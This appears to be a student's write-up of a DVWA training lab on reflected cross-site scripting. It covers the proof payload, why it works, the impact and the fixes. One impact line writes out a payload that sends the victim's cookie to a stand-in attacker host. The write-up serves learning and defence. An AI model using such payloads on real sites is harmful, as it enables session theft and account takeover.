# DVWA Lab 2: Reflected XSS (Low Difficulty)

## Vulnerability Type
Reflected Cross-Site Scripting (XSS)

## Payload Used
```javascript
<script>alert('XSS Vulnerability Confirmed')</script>
```

## What Happened
Submitted the payload in the "Name" field. The browser executed the JavaScript code and displayed an alert box with the message "XSS Vulnerability Confirmed".

## Why It Works
The application reflects user input directly in the HTML response without encoding or sanitizing.

When you submit the form, the app returns:
```html
<p>Hello <script>alert('XSS Vulnerability Confirmed')</script></p>
```

The browser parses this as HTML and executes the `<script>` tag.

## Security Impact
- **Severity:** HIGH
- Attacker can inject malicious JavaScript
- Can steal session cookies: `document.location='http://attacker.com/steal.php?cookie='+document.cookie`
- Can redirect user to phishing site
- Can keylog user inputs
- Can deface the web page
- Can perform actions on behalf of the user

## Real-World Example
Banking website. Attacker sends victim a link:
Victim clicks link → JavaScript runs → session cookie stolen → attacker logs in as victim.

## Types of XSS
1. **Reflected XSS** (this lab) — payload in URL/form, reflected back in response
2. **Stored XSS** — payload stored in database, executed when other users view it
3. **DOM-based XSS** — vulnerability in client-side JavaScript

## How to Fix
1. **HTML Encode all user input**
```php
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
```

2. **Use Content Security Policy (CSP)**
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'">
```

3. **Use security libraries**
```javascript
// Use DOMPurify to sanitize user input
DOMPurify.sanitize(userInput);
```

4. **Input Validation**
- Whitelist allowed characters
- Reject `<`, `>`, `"`, `'`, `;`

5. **HTTPOnly & Secure Cookies**
## OWASP Reference
Broken Access Control and Injection (#1 & #3 in OWASP Top 10 2021)

## Tools Used
- DVWA (Docker)
- Browser Developer Tools

## Date Completed
June 19, 2026
